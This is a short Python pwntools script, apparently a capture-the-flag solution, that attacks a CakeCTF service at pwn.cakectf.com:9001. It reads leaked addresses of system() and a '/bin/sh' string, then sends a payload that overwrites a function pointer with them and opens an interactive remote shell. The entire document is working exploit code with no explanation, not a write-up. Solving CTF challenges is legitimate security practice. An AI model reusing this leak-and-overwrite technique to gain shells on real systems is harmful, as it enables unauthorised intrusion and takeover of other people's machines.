from pwn import *

p = remote("pwn.cakectf.com", 9001)

p.recvuntil("  <system> = ")
system = int(p.recv(14), 16)
success("system: %s"%hex(system))
# get binsh address
p.sendlineafter("> ", "4")
p.recvline()
p.recvline()
p.recvline()
binsh =  int(p.recv(14), 16) + 0x8*6
success("binsh: %s"%hex(binsh))
p.sendlineafter("> ", "3")
p.sendlineafter("> ", "2")
p.sendlineafter("Message: ", p64(system) + p64(binsh))
p.sendlineafter("> ", "2")
# p.sendlineafter("Message: ", "/bin/sh")

p.interactive()

